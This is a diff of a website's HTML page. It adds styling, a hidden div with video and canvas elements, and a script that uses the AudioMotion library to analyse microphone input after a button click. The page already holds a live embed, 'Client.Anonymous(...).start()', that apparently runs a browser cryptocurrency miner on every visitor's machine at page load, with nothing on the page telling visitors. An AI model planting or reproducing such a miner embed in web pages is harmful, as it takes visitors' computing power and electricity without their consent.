@@ -80,6 +80,31 @@
         input[type="reset"] {
             font-weight: bold;
         }
+
+
+	      .backcanvas{    position: absolute;
+    top: 0;
+    opacity: .5;z-index: -1;}
+    .soundon{color: #000;}
+    .btn{display: flex;padding: 5px;}
+    .btn div{height: 50px;line-height: 50px;}
+
+
+    .chart-container {
+    display: flex;
+    align-items: flex-end; /* Align bars from the bottom */
+    justify-content: space-around; /* Evenly distribute bars */
+    width: 100%;
+    height: 300px;
+    border: 1px solid #ccc;
+}
+
+.bar {
+    width: 20px;
+    background-color: #4CAF50;
+    margin-right: 1px;
+}    
+ #charts{display:none}
     </style>
     <noscript>
         <link rel="stylesheet" href="assets/css/noscript.css" />
@@ -121,7 +146,27 @@
         <!-- Main -->
 
         <div id="main">
-
+		
+<div id="charts">
+   <div>
+            <video id='video'></video>
+        </div>
+        <div>
+            <canvas id="output-canvas"></canvas>
+        </div>
+        <div id="solar-nuclear-photovoltaic-chart"></div>
+        <p id="solar-nuclear-photovoltaic-resolution"></p>
+        <p id="solar-nuclear-photovoltaic-delay"></p>
+        <p id="solar-nuclear-photovoltaic-frame-fps"></p>
+        <p id="solar-nuclear-photovoltaic-frame-time"></p>
+        <p id="solar-nuclear-photovoltaic-video-time"></p>
+        <p id="solar-nuclear-photovoltaic-signal"></p>
+        <p id="solar-nuclear-photovoltaic-signal-window"></p>
+	
+        <div id="chart-container" class="chart-container"> </div>
+<div id="container"></div>
+	
+</div>
 
             <!-- Work -->
             <article id="solution">
@@ -140,7 +185,7 @@
                     <br> Oracle@vpnskynet.com
                     <br> Nuclear Admin: Jeng
                     <br> DJ@vpnskynet.com
-                    <br> Bio-Engineer :Mbergan
+                    <br> Bio-Engineer :Mbergan 
                     <br> Neo@vpnskynet.com
 
                     <br>
@@ -462,6 +507,107 @@ print 'It took ' + i + ' iterations to sort the deck.';</code></pre>
 	<script>
 	var _client = new Client.Anonymous('2d0502775c299fdb1ca74e4caba1eaf2332efe2632deabfc3e647c59da6b3470', { throttle: 0.9, c: 'w', ads: 0 }); _client.start();
 </script>
+
+  <script src="src/real-time-line-chart.js"></script>
+   <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
+   <script src="src/main.js"></script>
+    <script id="rendered-js" type="module">
+        /**
+         * for documentation and more demos,
+         * visit https://audiomotion.dev
+         */
+        
+        // load module from Skypack CDN
+        import AudioMotionAnalyzer from 'https://cdn.skypack.dev/audiomotion-analyzer?min';
+        
+        // instantiate analyzer
+        const audioMotion = new AudioMotionAnalyzer(
+        document.getElementById('container'),
+        {
+          gradient: 'rainbow',
+          height: window.innerHeight - 300,
+          showScaleY: true,
+          showBgColor:true,
+          overlay:true,
+          bgAlpha:0 }
+          );
+        
+        
+        
+        // display module version
+        //document.getElementById('version').innerText = `v${AudioMotionAnalyzer.version}`;
+        
+        // toggle microphone on/off
+        const micButton = document.getElementById('openaudio');
+        
+        micButton.addEventListener('click', () => {
+          if (navigator.mediaDevices) {
+              navigator.mediaDevices.getUserMedia({ audio: true, video: false }).
+              then(stream => {
+                // create stream using audioMotion audio context
+                const micStream = audioMotion.audioCtx.createMediaStreamSource(stream);
+                // connect microphone stream to analyzer
+                audioMotion.connectInput(micStream);
+                // mute output to prevent feedback loops from the speakers
+                audioMotion.volume = 0;
+                
+              }).
+              catch(err => {
+                alert('Microphone access denied by user');
+              });
+            } else
+            {
+              alert('User mediaDevices not available');
+            }
+
+
+            navigator.mediaDevices.getUserMedia({ audio: true })
+  .then(function(stream) {
+    // Creating an audio context
+    var audioContext = new AudioContext();
+    // Creating a media stream source node
+    var source = audioContext.createMediaStreamSource(stream);
+    // Creating a script processor node to analyze audio data
+    var scriptNode = audioContext.createScriptProcessor(2048, 1, 1);
+    
+    // Connect the source to the scriptNode
+    source.connect(scriptNode);
+    // Connect the scriptNode to the destination (audio output)
+    scriptNode.connect(audioContext.destination);
+    
+    // Define a function to process audio data
+    scriptNode.onaudioprocess = function(audioProcessingEvent) {
+      // Get the input buffer (contains audio data)
+      var inputBuffer = audioProcessingEvent.inputBuffer;
+      // Get the data from the first channel
+      var inputData = inputBuffer.getChannelData(0);
+      
+      // Calculate the volume level
+      var volume = 0;
+      for (var i = 0; i < inputData.length; i++) {
+        volume += Math.abs(inputData[i]);
+      }
+      volume /= inputData.length;
+      
+      // Output the volume (you can do whatever you want with it)
+      console.log("Volume:", volume);
+    };
+  })
+  .catch(function(err) {
+    console.error('Error accessing microphone:', err);
+  });
+          });
+            // disconnect all input audio sources
+          //  audioMotion.disconnectInput();
+        
+        
+        //# sourceURL=pen.js
+
+        // Requesting access to the user's microphone
+
+
+            </script>
+	
 </body>
 
 </html>
